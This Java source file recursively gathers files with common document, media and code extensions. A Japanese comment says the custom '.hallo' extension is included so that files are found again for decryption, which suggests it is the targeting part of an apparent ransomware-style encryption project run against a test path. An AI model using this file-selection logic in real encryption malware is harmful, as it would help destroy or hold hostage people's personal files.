package finder;

import tools.FileUtillity;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class SearchTarget {

  // ターゲットパス
  private String path;

  public SearchTarget() {
    path = GetTestPath.TEST_PATH;
    searchDir(path);
  }

  public String getPath() {
    return path;
  }

  // ターゲットになるファイルのリスト
  private List<File> targetList = new ArrayList<>();

  public List<File> getTargetList() {
    return targetList;
  }

  // ターゲットにしたい拡張子のリスト
  private List<String> targetExtensionList = Arrays.asList(
      ".mp3",
      ".txt",
      ".java",
      ".jpg",
      ".jpeg",
      ".png",
      ".pdf",
      ".docx",
      ".py",
      ".hallo" // TODO 暫定 - 復号化の際に詮索対象になるように追加
  );

  /**
   * Add target (file) in targetList.
   * if target is directory, search recursively down until reach to files.
   *
   * @param path path of target
   */
  private void searchDir(String path) {
    try {
      File[] fileList = new File(path).listFiles();
      if (fileList == null) return;

      for (File file : fileList) {
        if (isTargetFile(file)) targetList.add(file);
        else searchDir(file.getCanonicalPath());
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  private boolean isTargetFile(File file) {
    return !file.isDirectory() && targetExtensionList.contains(FileUtillity.getExtension(file));
  }
}
